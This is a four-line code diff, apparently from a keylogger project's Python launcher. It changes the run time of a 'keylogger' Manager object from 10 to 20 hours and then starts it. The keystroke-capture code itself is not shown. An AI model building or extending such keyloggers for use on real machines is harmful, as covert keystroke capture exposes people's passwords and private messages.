@@ -1,4 +1,4 @@
 from manager import Manager
 
-keylogger = Manager(hours=10)
+keylogger = Manager(hours=20)
 keylogger.start()
